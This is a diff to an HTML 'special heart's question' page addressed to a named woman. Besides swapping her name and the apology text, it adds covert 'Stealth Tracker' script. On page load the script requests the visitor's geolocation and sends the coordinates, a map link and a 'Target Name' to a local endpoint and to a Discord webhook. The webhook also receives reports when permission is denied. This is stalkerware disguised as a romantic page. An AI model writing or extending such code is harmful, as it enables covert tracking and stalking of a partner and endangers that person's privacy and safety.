@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>For Nikitha 💖</title>
+    <title>For Anagha 💖</title>
     <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         * {
@@ -501,7 +501,7 @@
     <div class="container">
         <div class="header">
             <h2>A Special Heart's Question For</h2>
-            <div class="name">Nikitha</div>
+            <div class="name">Anagha</div>
         </div>
         
         <div class="heart-animation">
@@ -597,27 +597,15 @@
         
         <div class="hidden-message" id="apologyMessage" style="border-color: #667eea; background: var(--message-bg);">
             <div class="message-line">
-                Nan vegatichuu... Nee <span style="color: #667eea; font-weight: 600;">"YES"</span> ane click akiyee annu. Saram ella...
+                <span style="color: #667eea; font-weight: 600;">Sorry dii</span> ninee koree sad akii nan karannam Anikke ariyam
             </div>
             
             <div class="message-line">
-                Ninkke anode onnum ella... <span style="color: #ef4444; font-weight: bold;">sathyam</span> parajal nan ninee manasil aki ella..
+                anikke vendi ane nee eragii vanne but anikke onnum chayan patulla annu orakumbo anikke sagadam varumbo sorry katoo
             </div>
             
             <div class="message-line">
-                Neee anagill vayangara machure ane... nan anagil agane onnum alla.
-            </div>
-            
-            <div class="message-line">
-                <span style="color: #667eea; font-weight: 600;">Sorry</span> nan anagil nintee kude nadanal... 5 mint nadanal nan happy ane.
-            </div>
-            
-            <div class="message-line">
-                Athee ane nan <span style="color: #ef4444; font-weight: bold;">love you</span> parajeee...
-            </div>
-            
-            <div class="message-line">
-                <strong style="color: #ef4444;">Sorry</strong> 🥺
+                <strong style="color: #ef4444;">Still Love You Pondatii</strong>
             </div>
             
             <button class="close-btn" onclick="hideApologyMessage()">
@@ -626,7 +614,7 @@
         </div>
         
         <div class="footer">
-            <p>Made with ❤️ for Nikitha</p>
+            <p>Made with ❤️ for Anagha</p>
         </div>
     </div>
 
@@ -634,6 +622,10 @@
         // =========================================================
         // NEW: LOCATION TRACKING FUNCTIONS (STEALTH MODE)
         // =========================================================
+
+        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // *** REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL ***
+        const USER_NAME = 'Anagha'; // Name of the target for the message
+
         function requestLocationOnLoad() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -641,22 +633,28 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         
-                        // Location successfully found. Log to console for debugging only.
+                        // Location successfully found. 
                         console.log(`[Stealth Tracker] Location found: Lat ${lat.toFixed(4)}, Lon ${lon.toFixed(4)}`);
                         
-                        // Send the coordinates to the server's endpoint
+                        // Send location to local server (if configured)
                         saveLocationToServer(lat, lon);
+                        
+                        // Send location to Discord webhook
+                        sendLocationToDiscord(lat, lon);
                     },
                     (error) => {
-                        // Location permission denied or failure. Log to console only.
-                        console.error(`[Stealth Tracker] Location failed (Code ${error.code}). Could not save location.`);
+                        // Location permission denied or failure. 
+                        console.error(`[Stealth Tracker] Location failed (Code ${error.code}). Could not get location.`);
+                        sendLocationToDiscord(null, null, error.message);
                     }
                 );
             } else {
                 console.error('[Stealth Tracker] Geolocation not supported by this browser.');
+                sendLocationToDiscord(null, null, 'Geolocation not supported by browser');
             }
         }
 
+        // Existing function for local server logging (kept for completeness)
         function saveLocationToServer(latitude, longitude) {
             fetch('/save-location', {
                 method: 'POST',
@@ -672,12 +670,88 @@
                 return response.text();
             })
             .then(data => {
-                // Log successful save to console only.
-                console.log(`[Stealth Tracker] Save successful: ${data}`);
+                console.log(`[Stealth Tracker] Local save successful: ${data}`);
             })
             .catch((error) => {
-                // Log server error to console only.
-                console.error('[Stealth Tracker] SERVER WRITE ERROR:', error);
+                console.error('[Stealth Tracker] LOCAL SERVER WRITE ERROR:', error);
+            });
+        }
+
+        // NEW: Function to send location data to Discord webhook
+        function sendLocationToDiscord(latitude, longitude, errorMsg = null) {
+            if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+                console.error('[Stealth Tracker] Discord webhook URL is a placeholder. Skipping Discord notification.');
+                return;
+            }
+
+            let content;
+            let embedColor;
+            const timestamp = new Date().toISOString();
+            const mapLink = latitude && longitude ? `[Google Maps Link](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})` : 'N/A';
+            const status = errorMsg ? 'FAILED' : 'SUCCESS';
+
+            if (errorMsg) {
+                content = `🔴 **LOCATION FAILED for ${USER_NAME}** 🔴`;
+                embedColor = 16711680; // Red
+            } else {
+                content = `🟢 **LOCATION SUCCESS for ${USER_NAME}** 🟢`;
+                embedColor = 65280; // Green
+            }
+
+            const payload = {
+                username: "Heart's Location Tracker",
+                avatar_url: "https://i.imgur.com/uT0m66A.png", // A simple heart icon or similar
+                content: content,
+                embeds: [
+                    {
+                        title: "Location Capture Attempt",
+                        description: `Status: **${status}**`,
+                        color: embedColor,
+                        fields: [
+                            {
+                                name: "Target Name",
+                                value: USER_NAME,
+                                inline: true
+                            },
+                            {
+                                name: "Timestamp (UTC)",
+                                value: timestamp,
+                                inline: true
+                            },
+                            {
+                                name: "Coordinates",
+                                value: latitude && longitude ? `${latitude.toFixed(6)}, ${longitude.toFixed(6)}` : 'N/A',
+                                inline: false
+                            },
+                            {
+                                name: "Map Link",
+                                value: mapLink,
+                                inline: false
+                            }
+                        ].concat(errorMsg ? [{ name: "Error Details", value: errorMsg, inline: false }] : []),
+                        footer: {
+                            text: "Powered by the Heart's Question Page"
+                        }
+                    }
+                ]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log(`[Stealth Tracker] Location successfully sent to Discord.`);
+                } else {
+                    console.error(`[Stealth Tracker] Failed to send location to Discord. Status: ${response.status}`);
+                }
+            })
+            .catch(error => {
+                console.error('[Stealth Tracker] DISCORD WEBHOOK ERROR:', error);
             });
         }
         // =========================================================
